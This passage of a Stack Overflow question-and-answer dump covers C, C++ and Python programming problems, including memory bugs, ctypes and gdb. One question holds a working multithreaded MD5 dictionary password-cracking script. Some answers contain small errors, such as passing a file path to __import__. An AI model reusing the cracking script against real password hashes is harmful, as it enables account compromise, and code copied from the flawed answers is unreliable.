#include &lt;stdlib.h&gt;
#include &lt;gtk/gtk.h&gt;

#include ""record.h""

extern GtkWidget* mute_button;
extern GtkWidget *app;
...
</code></pre>

<p>When I try to compile get this error:</p>

<pre><code>error: unknown type name 'Recording'
</code></pre>

<p>What should I do ?</p>

<p>Thanks</p>
","9530","","<p>You need to include the header file where <code>Recording</code> is defined.  Without the header file, the compiler has no idea what <code>Recording</code> is, so it gives you an error.</p>

<p>Also, you should not use the macro <code>_RECORD_H</code> for your header's include guard.  Names beginning with an underscore and a capital letter such as that (as well as names beginning with two underscores) are reserved by the compiler.  Instead, use something like <code>RECORD_H</code> or <code>RECORD_H_INCLUDED</code>.</p>
"
"<p>In iOS, if I use <code>vswprintf</code> with a non-western locale, it will fail and return -1.</p>

<p>However, if I set the locale correctly it will write properly.</p>

<p>Why is this? Any ideas?</p>
","9530","","<p>Strangely, the implementation of <code>vswprintf</code> on iOS converts the wide string arguments it's given to narrow strings and then converts the result back to a wide string (I had to debug this issue once).  If your wide strings contain non-ASCII characters in them, then this is a lossy conversion, and only certain characters can be successfully converted.</p>

<p>The exact set of non-ASCII characters which can be converted depends on the current locale setting.  If you try to pass in unsupported characters, then <code>vswprintf</code> will fail by returning <code>-1</code> and setting <code>errno</code> to the error <code>EILSEQ</code> (illegal multibyte sequence).</p>

<p>On Mac OS X, at least, you can get around this by switching to a UTF-8 locale, e.g.:</p>

<pre><code>setlocale(LC_CTYPE, ""UTF-8"")
</code></pre>

<p>However, this doesn't appear to work on iOS, so if you need to be able to <code>vswprintf</code> all characters without knowing the locale in advance, I'm afraid you're out of luck unless you reimplement <code>vswprintf</code> yourself.</p>
"
"<p>I've been creating an idle program to count in minutes when the mouse and keyboard are inactive. This is what I have so far:</p>

<pre><code>using namespace std;

while(true)
{
    GetLastInputInfo(&amp;last_info);
    tickCount = GetTickCount();
    int minutes = (tickCount - last_info.dwTime) / 60000;
    count++;

    if((minutes &gt;= 1) &amp;&amp; (count%3000==0))
    {
        ifstream in(""in.txt"");
        ofstream out(""out.txt"");
        float sum;
        in &gt;&gt; sum;
        sum = sum++;
        out &lt;&lt; sum;
        out &lt;&lt; in.rdbuf();
        out.close();
        in.close();
    }
    std::cout &lt;&lt; ""Idle Time: "" &lt;&lt; minutes &lt;&lt; "" minutes."" &lt;&lt; std::endl;
}
}
</code></pre>

<p></p>

<p>When I run it idle for one minutes the ""sum"" says it's 1, I then close the program and open it up for one minutes again and the ""sum"" says it's 2. I close the program and open it for one more minute and it's back down to 1. Why is this happening?</p>
","9530","","<p>This line is undefined behavior:</p>

<pre><code>sum = sum++;
</code></pre>

<p>You can't modify a variable more than once between sequence points.  You should just write this instead to increment the <code>sum</code> variable:</p>

<pre><code>sum++;
</code></pre>
"
"<p>I've got a problem.</p>

<p>I've already wrote quite a piece of code in C++. I'm using MS Visual Studio 2010.</p>

<p>It's a class <code>matrix</code> with few simple numerical functions.</p>

<p>Below are implementations:</p>

<pre><code>//matrix.h
#pragma once
#define EPS pow(10., -12.)

#include &lt;iostream&gt;
#include &lt;iomanip&gt;
#include &lt;cmath&gt;

using namespace std;

class matrix
{
private:
    unsigned int n;     //number of columns
    unsigned int m;     //number of rows
    double* T;
public: 
    matrix ();
    matrix (unsigned int _n);
    matrix (unsigned int _n, unsigned int _m);
    ~matrix ();
    matrix (const matrix&amp; A);
    matrix operator = (const matrix&amp; A);

    unsigned int size_n () const;
    unsigned int size_m () const;

    void ones ();
    void zeros ();
    void identity ();

    void push (unsigned int i, unsigned int j, double v);

    void lu ();
    void gauss ();
    double det ();
    void transposition ();
    void inverse ();
    bool symmetric ();
    bool diag_strong_domination ();

    void swap_rows (unsigned int i, unsigned int j);

    matrix gauss_eq (matrix b);

    friend bool operator == (const matrix A, const matrix B);

    friend matrix operator + (const matrix A, const matrix B);

    friend matrix operator * (const matrix A, const matrix B);

    double operator () (unsigned int i, unsigned int j) const;

    friend ostream&amp; operator &lt;&lt; (ostream&amp; out, const matrix&amp; A);
};

matrix::matrix () : n(0), m(0)
{    
    this-&gt;T = NULL;
}


matrix::matrix (unsigned int _n) : n(_n), m(_n)
{    
    if (0==_n)
    {
        this-&gt;T = NULL;
        return;
    }

    this-&gt;T = new double [(this-&gt;n)*(this-&gt;m)];

    for (unsigned int i=0; i&lt;this-&gt;n*this-&gt;m; i++)
        this-&gt;T[i] = (double)0;
}


matrix::matrix (unsigned int _n, unsigned int _m) : n(_n), m(_m)
{
    if (0==_m || 0==_n)
        throw ""Error: Wrong matrix dimensios"";

    this-&gt;T = new double [n*m];

    for (unsigned int i=0; i&lt;n*m; i++)
        this-&gt;T[i] = (double)0;
}


matrix::~matrix ()
{
    delete this-&gt;T;
}


matrix::matrix (const matrix&amp; A) : n(A.n), m(A.m)
{
    this-&gt;T = new double [n*m]; //(double*)malloc(A.m*A.n*sizeof(double));

    for (unsigned int i=0; i&lt;n*m; i++)
        this-&gt;T[i] = A.T[i];
}


matrix matrix::operator= (const matrix&amp; A)
{
    if (!(*this==A))
    {
        this-&gt;m = A.m;
        this-&gt;n = A.n;

        delete this-&gt;T;
        this-&gt;T = new double [A.n*A.m];

        for (unsigned int i=0; i&lt;A.n*A.m; i++)
            this-&gt;T[i] = A.T[i];
    }

    return *this;
}



unsigned int matrix::size_n () const
{
    return this-&gt;n;
}

unsigned int matrix::size_m () const
{
    return this-&gt;m;
}

void matrix::ones ()
{
    for (unsigned int i=0; i&lt;(this-&gt;m)*(this-&gt;m); i++)
        (*this).T[i] = double(1);

    return;
}

void matrix::zeros ()
{
    for (unsigned int i=0; i&lt;(this-&gt;m)*(this-&gt;m); i++)
        (*this).T[i] = double(0);

    return;
}

void matrix::identity ()
{
    if (this-&gt;m!=this-&gt;n)
        throw ""Error: Matrix have to be square (identity)"";

    for (unsigned int i=0; i&lt;(this-&gt;m)*(this-&gt;m); i++)
        (*this).T[i] = double(0);

    for (unsigned int k=1; k&lt;=this-&gt;m; k++)
        (*this).push(k, k, (double)1);

    return;

}

void matrix::push (unsigned int i, unsigned int j, double v)
{
    if (i&lt;=0 || i&gt;this-&gt;m || j&lt;=0 || j&gt;this-&gt;n)
        throw ""Error: Indeks out of range (push)"";

    this-&gt;T[(i-1)*this-&gt;n + (j-1)] = v;
}


void matrix::lu ()
{
    if (this-&gt;m!=this-&gt;n)
        throw ""Error: Matrix have to be square (lu)"";

    if ((*this).diag_strong_domination())
    {
        //Doolittle decomposition
        matrix L(this-&gt;m);
        matrix U(this-&gt;m);

        for (unsigned int b=1; b&lt;=this-&gt;m; b++)
            L.push(b, b, (double)1);

        for (unsigned int b=1; b&lt;=this-&gt;m; b++)
            U.push(1, b, (*this)(1,b));

        for (unsigned int b=2; b&lt;=this-&gt;m; b++)
        {
            for (unsigned int c=1; c&lt;=this-&gt;m; c++)
            {
                for (unsigned int k=1; k&lt;=b-1; k++)
                {
                    double s1 = 0;

                    if (1==k)
                        s1 = (double)0;

                    else
                        for (unsigned int p=1; p&lt;=k-1; p++)
                            s1 += L(b,p) * U(p,k);

                    double v = ((*this)(b,k) - s1)/U(k,k);
                    L.push(b, k, v);
                }
                for (unsigned int k=b; k&lt;=this-&gt;m; k++)
                {
                    double s2 = 0;

                    for (unsigned int p=1; p&lt;=b-1; p++)
                        s2 += L(b,p) * U(p,k);

                    double v = (*this)(b,k) - s2;
                    U.push(b, k, v);
                }
            }
        }

        for (unsigned int p=1; p&lt;=this-&gt;m; p++)
            L.push(p, p, (double)0);

        (*this) = L + U;

        for (unsigned int x=0; x&lt;(*this).m*(*this).n; x++)
        {
            if (abs((*this).T[x])&lt;EPS)
                (*this).T[x] = (double)0;
        }

        return;
    }

    (*this).gauss();

    return;
}


void matrix::gauss()
{
    //LU decomposition (gauss elimination with partal choice of main element)
    unsigned int n = (*this).m;
    matrix U(*this);
    matrix svr(1,n);
    for (unsigned int a=1; a&lt;=n; a++)
        svr.push(a, 1, a);

    for (unsigned int k = 1; k&lt;=(n-1); k++)
    {
        //main element choice - column
        unsigned int max = k;
        for (unsigned int q=k; q&lt;=n; q++)
        {
            if (abs(U(q,k)) &gt; abs(U(max,k)))
                max = q;
        }
        unsigned int p = max;
        svr.push(k, 1, p);


        if (abs(U(p,k)) &lt; EPS)
            throw ""Error: det = 0"";

        //main element swap
        if (p!=k)
            U.swap_rows(p, k);

        //elimination
        for (unsigned int i=(k+1); i&lt;=n; i++)
        {
            double tmp = U(i,k)/U(k,k);
            for (unsigned int j=(k+1); j&lt;=n; j++)
            {
                double v = U(i,j) - tmp * U(k,j);
                U.push(i, j, v);
            }
        }
    }

    if (abs(U(n,n)) &lt; EPS)
        throw ""Error: det = 0"";

    for (unsigned int s=2; s&lt;=n; s++)
        for (unsigned int t=1; t&lt;=(s-1); t++)
            U.push(s, t, (double)0);

    matrix T = (*this);
    matrix Uinv(U);
    Uinv.inverse();
    matrix L(n);

    for (unsigned int i=1; i&lt;=n; i++)
        for (unsigned int j=1; j&lt;=n; j++)
            for (unsigned int k=1; k&lt;=n; k++)
            {
                double v = T(i,k) * Uinv(k,j);
                L.push(i, j, v);
            }

    //reversing rows swap
    for (unsigned int t=1; t&lt;=n; t++)
    {
        if (t!=svr(t,1))
            L.swap_rows(t, svr(t,1));
    }

    (*this) = L + U;

    for (unsigned int k=1; k&lt;=n; k++)
        (*this).push(k, k, (*this)(k,k) - (double)1);

    for (unsigned int x=0; x&lt;(*this).m*(*this).n; x++)
    {
        if (abs((*this).T[x])&lt;EPS)
            (*this).T[x] = (double)0;
    }

    return;
}


double matrix::det ()
{
    if (this-&gt;m!=this-&gt;n)
        throw ""Error: Matrix have to be square (det)"";

    double det = 1;
    matrix TMP = (*this);
TMP.lu();

for (unsigned int i=1; i&lt;=this-&gt;m; i++)
        det *= (double)(TMP(i,i));

return det;
}


void matrix::transposition()
{
    matrix R(*this);

    for (unsigned int i=1; i&lt;=(*this).m; i++)
        for (unsigned int j=1; j&lt;=(*this).n; j++)
            (*this).push(j, i, R(i,j));

    return;
}


void matrix::inverse ()
{
    unsigned int n = (*this).m;

    matrix A(*this);
    matrix X(n);
    matrix b(1,n);

    for (unsigned int i=1; i&lt;=n; i++)
    {
        b.zeros();
        b.push(i, 1, (double)1);

        X = A.gauss_eq(b); //error when using inverse in gauss function, used in lu

        for (unsigned int k=1; k&lt;=n; k++)
            (*this).push(i, k, X(k,1));
        }

    for (unsigned int x=0; x&lt;(*this).m*(*this).n; x++)
        if (abs((*this).T[x])&lt;EPS)
            (*this).T[x] = (double)0;

    return; //error when calling inverse
}


bool matrix::diag_strong_domination()
{
    for (unsigned int i=1; i&lt;=n; i++)
    {
        double s = (double)0;

        for (unsigned int j=1; j&lt;=n; j++)
        {
            if (j!=i)
                s += abs((*this)(i,j));
        }

        if (s&gt;=abs((*this)(i,i)))
            return false;
    }

    return true;
}


void matrix::swap_rows (unsigned int i, unsigned int j)
{
    if (i&lt;=0 || i&gt;this-&gt;m || j&lt;=0 || j&gt;this-&gt;n)
        throw ""Error: Indeks out of range (swap_rows)"";

    matrix R(*this);

    for (unsigned int p=1; p&lt;=this-&gt;m; p++)
        for (unsigned int q=1; q&lt;=this-&gt;n; q++)
        {
            if (p==i)
                (*this).push(p, q, R(j,q));
            if (p==j)
                (*this).push(p, q, R(i,q));
        }

    return;
}


matrix matrix::gauss_eq (matrix b)
{
    matrix A(*this);
    unsigned int n = this-&gt;m;

    for (unsigned int k=1; k&lt;=n-1; k++)
    {
        unsigned int max = k;
        for (unsigned int q=k; q&lt;=n; q++)
        {
            if (abs(A(q,k)) &gt; abs(A(max,k)))
                max = q;
        }
        unsigned int p = max;

        if (abs(A(p,k)) &lt; EPS)
            throw ""Error: det = 0 (gauss_eq)"";

        if (p!=k)
        {
            A.swap_rows(p,k);
            b.swap_rows(p,k);
        }

        for (unsigned int i=k+1; i&lt;=n; i++)
        {
            double tmp = A(i,k) / A(k,k);
            for (unsigned int j=k+1; j&lt;=n; j++)
                A.push(i, j, A(i,j) - tmp*A(k,j));
            b.push(i, 1, b(i,1) - tmp*b(k,1));
        }

        if (abs(A(n,n)) &lt; EPS)
            throw ""Error: det = 0 (gauss_eq)"";
    }

    matrix X(1,n);

    double s = 0;

    for (unsigned int i=n; i&gt;=1; i--)
    {
        for (unsigned int j=i+1; j&lt;=n; j++)
            s = s + (A(i,j)*X(j,1));
        X.push(i, 1, (b(i,1)-s)/A(i,i));
        s = 0;
    }

    return X;
}


bool operator == (const matrix A, const matrix B)
{
    if (A.size_m()!=B.size_m() || A.size_n()!=B.size_n())
        return false;

    for (unsigned int i=1; i&lt;=A.size_m(); i++)
        for (unsigned int j=1; j&lt;=A.size_n(); j++)
            if (A(i,j)!=B(i,j))
                return false;

    return true;
}

matrix operator + (const matrix A, const matrix B)
{
    if (A.m!=B.m || A.n!=B.n)
        throw ""Error: Wrong dimensions"";

    matrix R(A.n, A.m);

    for (unsigned int i=0; i&lt;A.m*A.n; i++)
        R.T[i] = A.T[i] + B.T[i];

    return R;
}

matrix operator * (const matrix A, const matrix B)
{
    if (A.n!=B.m)
        throw ""Error: Wrong dimensions"";

    matrix R(A.m,B.n);

    for (unsigned int i=1; i&lt;=R.m; i++)
        for (unsigned int j=1; j&lt;=R.n; j++)
            for (unsigned int k=1; k&lt;=A.n; k++)
            {
                double v = R(i,j) + A(i,k) * B(k,j);
                R.push(i, j, v);
            }

    return R;
}

double matrix::operator () (unsigned int i, unsigned int j) const
{
    if (i&lt;=0 || i&gt;this-&gt;m || j&lt;=0 || j&gt;this-&gt;n)
        throw ""Error: Indeks out of range (operator)"";

    return this-&gt;T[(i-1)*this-&gt;n + (j-1)];
}

ostream&amp; operator &lt;&lt; (ostream&amp; out, const matrix&amp; A)
{
    if (0==A.size_m() || 0==A.size_n())
    {
        out&lt;&lt;endl&lt;&lt;"" [  ]""&lt;&lt;endl;
        return out;
    }

    int s = 10;

    out&lt;&lt;endl&lt;&lt;"" [ "";

    for (unsigned int i=1; i&lt;=A.size_m(); i++)
    {
        for (unsigned int j=1; j&lt;=A.size_n(); j++)
            out&lt;&lt;"" ""&lt;&lt;setw(s)&lt;&lt;left&lt;&lt;A(i,j)&lt;&lt;"" "";

        if (i!=A.size_m())
            out&lt;&lt;endl&lt;&lt;""   "";
    }

    out&lt;&lt;"" ] ""&lt;&lt;endl;

    return out;
}
</code></pre>

<p>And the problem is that i have strange errors concerning memory.</p>

<p>Firstly, when I call function <code>inverse</code> like that:</p>

<pre><code>//MatLab.cpp

#include &lt;iostream&gt;
#include &lt;complex&gt;
#include &lt;typeinfo&gt;
using namespace std;

#include ""matrix.h""

int main()
{
    try
    {
        matrix S(4);

        for (unsigned int i=1; i&lt;=S.size_m(); i++)
            for (unsigned int j=1; j&lt;=S.size_n(); j++)
            S.push(i, j, (double)3);

        for (unsigned int i=1; i&lt;=S.size_m(); i++)
            S.push(i, i, (double)0);

        cout&lt;&lt;""S:""&lt;&lt;S&lt;&lt;endl;

        S.inverse();                     //&lt;--- here is the problem
        cout&lt;&lt;endl&lt;&lt;""S^(-1) = ""&lt;&lt;S&lt;&lt;endl;
    }
    catch (char* xcp)
    {
        cout&lt;&lt;endl&lt;&lt;xcp&lt;&lt;endl&lt;&lt;endl;
    }

    system(""pause"");
    return 0;
}
</code></pre>

<p>I got error when returning value in function <code>inverse</code>. When I step into I go to destrutor and have an error while I free memory.</p>

<p>However it's not all.</p>

<p>Another strange situation occurs when I call function <code>lu</code> like this:</p>

<pre><code>//MatLab.cpp

#include &lt;iostream&gt;
#include &lt;complex&gt;
#include &lt;typeinfo&gt;
using namespace std;

#include ""matrix.h""

int main()
{
    try
    {
        matrix S(4);

        for (unsigned int i=1; i&lt;=S.size_m(); i++)
            for (unsigned int j=1; j&lt;=S.size_n(); j++)
            S.push(i, j, (double)3);

        for (unsigned int i=1; i&lt;=S.size_m(); i++)
            S.push(i, i, (double)0);

        cout&lt;&lt;""S:""&lt;&lt;S&lt;&lt;endl;

        S.lu();                                  //&lt;--- here is the problem
        cout&lt;&lt;endl&lt;&lt;""LU decomposition""&lt;&lt;S&lt;&lt;endl;
    }
    catch (char* xcp)
    {
        cout&lt;&lt;endl&lt;&lt;xcp&lt;&lt;endl&lt;&lt;endl;
    }

    system(""pause"");
    return 0;
}
</code></pre>

<p>In this case error occurs also in function <code>inverse</code> used in function <code>gauss</code>, but this time when assigning the result of function <code>gauss_eq</code> to earlier defined matrix.</p>

<p>When I step into that problem I go to copy construtor (I don't know why) and I cannot allocate memory neither with new operator nor with <code>malloc</code> function.</p>

<p>When debugging nex statement to be executed is in <code>malloc.c</code> file in this function:</p>

<pre><code>__forceinline void * __cdecl _heap_alloc (size_t size)

{

    if (_crtheap == 0) {
        _FF_MSGBANNER();    /* write run-time error banner */
        _NMSG_WRITE(_RT_CRT_NOTINIT);  /* write message */
        __crtExitProcess(255);  /* normally _exit(255) */
    }

    return HeapAlloc(_crtheap, 0, size ? size : 1);
}
</code></pre>

<p>And parameter size equals 68.</p>

<p>I have no idea what can be wrong.</p>

<p>Whether the problem is in constructors or functions in class matrix or maybe in function from C libraries I use.</p>

<p>I hope someone devote his time to look into this problem despite it's a lot of code to look over.</p>

<p>Thanks for any tips.</p>
","9530","","<p>I haven't read all your code but this is definitely wrong:</p>

<pre><code>matrix::~matrix ()
{
    delete this-&gt;T;
}
</code></pre>

<p>You need to be calling the <code>delete[]</code> operator, not plain <code>delete</code>.  <code>new</code> must always be matched with <code>delete</code>, and <code>new[]</code> must always be matched with <code>delete[]</code>.  Failure to do is is undefined behavior and will usually result in some sort of memory corruption that will crash your program.</p>

<p>Likewise your implementation of <code>operator =</code> should also call <code>delete[]</code>.</p>

<p>There's also no need to prefix every member access with <code>this-&gt;</code> or <code>(*this).</code>.  It's not idiomatic C++ and should only be used in cases where there's a local variable shadowing a member variable (which itself isn't always good practice).</p>
"
"<p>I am trying to get a python script to open another python script in a directory that I know of but the actual filename is a variable. I would like to execute this file or be able to import the file (either way would work for what I am trying to do) but I am having problems with each one.</p>

<p>for trying to execute it, the dos style box appears but quickly disappears, too quickyl to really do anything. I even added a Raw_Input() and executed the file on its own and got it to work. here is the like on code:</p>

<pre><code>os.system(""python actions/""+Script)
</code></pre>

<p>Script being the name of the python file in a string. I know that the file is found but the problem is that it disapears too quickly</p>

<p>the other way I am trying to do it is by importing the file:</p>

<pre><code>import 'actions/'+Script
</code></pre>

<p>this is the only logical way I can think of to import the damn thing but I keep getting syntax errors</p>
","9530","","<p>Use the <a href=""http://docs.python.org/library/functions.html#__import__"" rel=""nofollow""><code>__import__</code> function</a> to import a module whose name isn't known until runtime:</p>

<pre><code># Import the module
mymodule = __import__('actions/' + Script)

# Call functions in the module etc.
mymodule.do_something(42);
</code></pre>
"
"<p>Is there a macro trick to rename just the function calls without affecting the function definition, specifically for gcc/cpp:</p>

<pre><code>#define get_resolution __mock_get_resolution
</code></pre>

<p>The above macro changes all places, but I just want this to take effect for the function call <code>get_resolution();</code> without affecting the definition <code>void get_resolution()</code></p>

<pre><code>void get_resolution()
{
}

void display()
{
    get_resolution();
}
</code></pre>
","9530","","<p>No, the C preprocessor has no semantic knowledge of the structure of the C program, it just sees text tokens.</p>

<p>One option would be to <code>#undef</code> the macro before the definition and redefine it afterwards, but this is messy.  Another option would be to add a macro to the definition of each function you want to mock like this:</p>

<pre><code>#if DO_MOCKING
#define IMPLEMENT_MOCKABLE_FUNCTION(funcname) _real_ ## funcname
#define get_resolution _mock_get_resolution
#else
#define IMPLEMENT_MOCKABLE_FUNCTION(funcname) funcname
#endif

...

void IMPLEMENT_MOCKABLE_FUNCTION(get_resolution)()
{
    ...
}
</code></pre>

<p>Also note that identifiers beginning with two underscores, as well as identifiers beginning with an underscore followed by a capital letter, are reserved by the implementation (i.e. the compiler and standard libraries).  So I've renamed the identifiers in the example above to use a single underscore and a lowercase letter.</p>
"
"<p>In the following code:</p>

<pre><code> 1 #include &lt;iostream&gt;
 2
 3 using namespace std;
 4
 5 int funcA(){
 6    cout &lt;&lt; ""A"" &lt;&lt; endl;
 7    return 1;
 8 }
 9
10 int funcB(){
11    cout &lt;&lt; ""B"" &lt;&lt; endl;
12    return 1;
13 }
14
15 int funcC(){
16    cout &lt;&lt; ""C"" &lt;&lt; endl;
17    return 1;
18 }
19
20 int funcAll( int a, int b, int c ){
21    return 1;
22 }
23
24 int main(){
25    cout &lt;&lt; funcAll( funcA(), funcB(), funcC() ) &lt;&lt; endl;
26    return 0;
27 }
28
</code></pre>

<p>Will be printed C, B, then A.</p>

<p>But when debuging and staying on line 25 if we command <code>next</code> on gdb the cursor goes to the line 26, if we command <code>step</code> gdb will step from funcC until funcA, but how to directly step on funcB OR funcA without setting a breakpoint or steping inside funcC.</p>
","9530","","<p>The order of evaluation of the arguments of a function in C and C++ is unspecified.  The compiler is free to reorder/interleave them however it sees fit, within certain constraints.  So you cannot rely on <code>funcC()</code> getting called before <code>funcA()</code>.</p>

<p>If you want to ensure that the arguments will get evaluated in a certain order, break them up into separate statements like this:</p>

<pre><code>int a = funcA();
int b = funcB();
int c = funcC();
cout &lt;&lt; funcAll(a, b, c,) &lt;&lt; endl;
</code></pre>

<p>This will also make debugging easier.</p>

<p>If you don't want to rewrite your code, you still have some alternatives.  The easiest thing to do is just set a breakpoint inside your function of interest, e.g.:</p>

<pre><code>break funcB
</code></pre>

<p>Or if you only need to do this once, use a <code>tbreak</code> instead of <code>break</code> to set a temporary breakpoint which will clear itself after it's hit for the first time.</p>

<p>You can also use the <code>nexti</code> and <code>stepi</code> instructions to step one assembly instruction at a time.  By looking at the disassembly with the <code>disassemble</code> command, you can step up to the appropriate call site (e.g. the <code>call</code> instruction on x86 or x86-64, or <code>bl</code> on PowerPC) using <code>nexti</code>, then <code>stepi</code> to step into it.  <code>stepi</code> and <code>nexti</code> work like <code>step</code> and <code>next</code>, except they operate on assembly instructions instead of lines of code.</p>
"
"<p>I use python 2.7, and I have a simple multitheaded md5 dict brute:</p>

<pre><code># -*- coding: utf-8 -*-

import md5
import Queue
import threading
import traceback

md5_queue = Queue.Queue()


def Worker(queue):
    while True:
        try:
            item = md5_queue.get_nowait()
        except Queue.Empty:
            break
        try:
            work(item)
        except Exception:
            traceback.print_exc()

        queue.task_done()


def work(param):
    with open('pwds', 'r') as f:
        pwds = [x.strip() for x in f.readlines()]

    for pwd in pwds:
        if md5.new(pwd).hexdigest() == param:
            print '%s:%s' % (pwd, md5.new(pwd).hexdigest())


def main():
    global md5_queue
    md5_lst = []
    threads = 5

    with open('md5', ""r"") as f:
        md5_lst = [x.strip() for x in f.readlines()]

    for m in md5_lst:
        md5_queue.put(m)    # add md5 hash to queue

    for i in xrange(threads):
        t = threading.Thread(target=Worker, args=(md5_queue,))
        t.start()

    md5_queue.join()


if __name__ == '__main__':
    main()
</code></pre>

<p>Work in 5 threads. Each thread reads one hash from queue and checks it with list of passwords. Pretty simple: 1 thread 1 check in 'for' loop.</p>

<p>I want to have a little bit more: 1 thread and few threads to check passwords. So work() should read hash from queue and start a new number of threads to check passwords (1 thread hash, 10 thread there check for passwords). For example: 20 threads with hash and 20 threads to brute the hash in each thread. Something like that.</p>

<p>How can I do this?</p>

<p>P.S. Sorry for my explanation, ask if you did not understood what I want.</p>

<p>P.P.S. It's not about bruting md5, it's about multi-threading.</p>

<p>Thanks.</p>
","9530","","<p>The default implementation of Python (called CPython) uses a <a href=""http://en.wikipedia.org/wiki/Global_Interpreter_Lock"" rel=""nofollow"">Global Interpreter Lock</a> (GIL) that effectively only allows one thread to be running at once.  For I/O bound multithreaded applications, this is not usually a problem, but for CPU-bound applications like yours, it means you're not going to see much of a multicore speedup.</p>

<p>I'd suggest using a different Python implementation that doesn't have a GIL such as Jython, or rewriting your code to use a different language that doesn't have a GIL.  Writing it in natively compiled code is a good idea, but most scripting languages that have an MD5 function usually implement that in native code anyways, so I honestly wouldn't expect much of a speedup between a natively compiled language and a scripting language.</p>
"
"<p>I'm creating a windows DLL library that contains a logging class, the log function in that class simply calls fprintf like this for testing purposes:</p>

<p>fprintf(stderr, ""DEBUG:   %s\n"", ""Hello"");   </p>

<p>Now this call works fine if i use it from any function in any file in my other project (that uses the library) but if i put it anywhere in my library with the logging class it simply wont print anything.<br>
I can see it runs the function correctly (using a simple exit(0); to test).  </p>

<p>Now i'm still kinda new to the whole Library concept in c/c++ so there might be something i just don't understand, but otherwise i don't know why it doesn't work.   </p>

<p>I tried searching here and on google, but i couldn't find anyone else with the same exact problem.<br>
I use VC++ 2010</p>

<p>EDIT: I got the idea of passing the filepointer instead of just using stderr from the library, this causes an exception to be thrown however (the _tmpfname pointer of the file is NULL at the time of the throw, which im not sure is correct)</p>
","9530","","<p>I would avoid doing this for any production code (it's ok for testing though).  The standard I/O streams belong to the application, and <a href=""http://blogs.msdn.com/b/oldnewthing/archive/2009/12/02/9931183.aspx"" rel=""nofollow"">the DLLs are guests in the house</a>.  If you want to provide debug output, allow the application to setup a callback function for logging, e.g.:</p>

<pre><code>// In your DLL's header file:
typedef void (*LogFunc)(const char *, ...);
void DLLEXPORT SetLogFunction(LogFunc logFunc);

// In your DLL's source file:
LogFunc g_LogFunc;
void DLLEXPORT SetLogFunction(LogFunc logFunc)
{
    g_LogFunc = logFunc;
}

...
// Then, instead of calling fprintf(stderr, ""blah""), do this:
g_LogFunc(""blah"");
</code></pre>

<p>If you're just doing this for testing, you can write directly to <code>stderr</code>, but keep in mind that the DLL and the application must be linked against the same version of the C runtime in order for that to work.  The C runtime is itself a DLL, and if your DLL and the application specify different versions of the C runtime, you'll end up loading two separate copies of the C runtime into memory, each with their own idea of what <code>stderr</code> means.  When they're different, bad stuff happens.</p>

<p>In Visual Studio, to set the C runtime library you're using, open up your project settings and go to <strong>Configuration Properties → C/C++ → Code Generation → Runtime Library</strong> and make sure that both the DLL and the application are set to the exact same value (typically ""Multi-threaded DLL (/MD)"" or ""Multi-threaded Debug DLL (/MDd)"", depending on whether you're building a Debug or Release build).</p>
"
"<pre><code>int array[5][3];
</code></pre>

<p>(obviously) creates a multi-dimensional C array of 5 by 3. However,</p>

<pre><code>int x = 5;
int array[x][3];
</code></pre>

<p>does <strong>not</strong>. I've always thought it would. What don't I understand about C arrays? If they only allow a constant to define the length of a C array, is there a way to get around this in some way?</p>
","9530","","<p>In ANSI C (aka C89), all array dimensions must be compile-time integer constants (this <strong>excludes</strong> variables declared as <code>const</code>).  The one exception is that the first array dimension can be written as an empty set of brackets in certain contexts, such as function parameters, <code>extern</code> declarations, and initializations.  For example:</p>

<pre><code>// The first parameter is a pointer to an array of char with 5 columns and an
// unknown number of rows.  It's equivalent to 'char (*array_param)[5]', i.e.
// ""pointer to array 5 of char"" (this only applies to function parameters).
void some_function(char array_param[][5])
{
    array_param[2][3] = 'c';  // Accesses the (2*5 + 3)rd element
}

// Declare a global 2D array with 5 columns and an unknown number of rows
extern char global_array[][5];

// Declare a 3x2 array.  The first dimension is determined by the number of
// initializer elements
int my_array[][2] = {{1, 2}, {3, 4}, {5, 6}};
</code></pre>

<p>C99 added a new feature called <em>variable-length arrays</em> (VLAs), where the first dimension is allowed to be a non-constant, but only for arrays declared on the stack (i.e. those with <em>automatic storage</em>).  Global arrays (i.e. those with <em>static storage</em>) cannot be VLAs.  For example:</p>

<pre><code>void some_function(int x)
{
    // Declare VLA on the stack with x rows and 5 columns.  If the allocation
    // fails because there's not enough stack space, the behavior is undefined.
    // You'll probably crash with a segmentation fault/access violation, but
    // when and where could be unpredictable.
    int my_vla[x][5];
}
</code></pre>

<p>Note that the latest edition of the C standard, C11, makes VLAs optional.  Objective-C is based off of C99 and supports VLAs.  C++ does <strong>not</strong> have VLAs, although many C/C++ compilers such as g++ which support VLAs in their C implementation also support VLAs in C++ as an extension.</p>
"
"<p>I'm have difficulty with a seeming simple problem. There are various C functions that I need to call from Python code. Currently, I'm trying to do this through ctypes. I'm having issues with a simple example implementation that I'm using to ensure that everything works as intended before changing large chunks of existing code. The C functions take a few parameters, do various mathematical calculations, and then return a double value. This is the C file that I'm using as a test.</p>

<pre><code>#include ""Python.h""

double eval(double* args, int length, double* rands, int randLength, int debug)
{
    double val1 = args[0];
    double val2 = rands[0];
    double ret = val1 + val2;
    return ret;
}
</code></pre>

<p>In my actual test function I'm printing <i>val1</i> and <i>val2</i> to ensure they're receiving values. Everything is fine on that end. The Python that calls this function is the following.</p>

<pre><code>test = ctypes.CDLL(""/home/mjjoyce/Dev/C2M2L/AquaticWavesModel.so"")
rand = Random();

args = [2]
argsArr = (ctypes.c_double * len(args))()
argsArr[:] = args

argsRand = [rand.random()]
argsRandArr = (ctypes.c_double * len(argsRand))()
rgsRandArr[:] = argsRand

result = test.eval(argsArr, len(argsArr), argsRandArr, len(argsRandArr), 0)
print ""result"", result
</code></pre>

<p>When this prints the returned result, it usually dumps a large negative number. It's my assumption that I need to do some converting before Python can handle the value, but I can't find an answer for that for the life of me. I've searched forever, but I'm not certain if I'm missing the obvious, or searching for the wrong information. </p>

<p>Also, if I change the return type of the function to int, the calculations turn out correct and an int is returned and printed as expected. If I set it to double, the calculations are correct in the C code (I print them to check), but Python doesn't like the returned result.</p>

<p>Any ideas what I'm missing?</p>
","9530","","<p>You should set the function's argument types and return type in Python using the <code>argtypes</code> and <code>restype</code> members:</p>

<pre><code>test.eval.argtypes = [ctypes.POINTER(ctypes.c_double),
                      ctypes.c_int,
                      ctypes.POINTER(ctypes.c_double),
                      ctypes.c_int,
                      ctypes.c_int]
test.eval.restype = ctypes.c_double
</code></pre>

<p>Then you can call it like you're doing: construct arrays of type <code>(ctypes.c_double * length)</code> initialized with your values, and the <code>result</code> will be a <code>double</code>.</p>

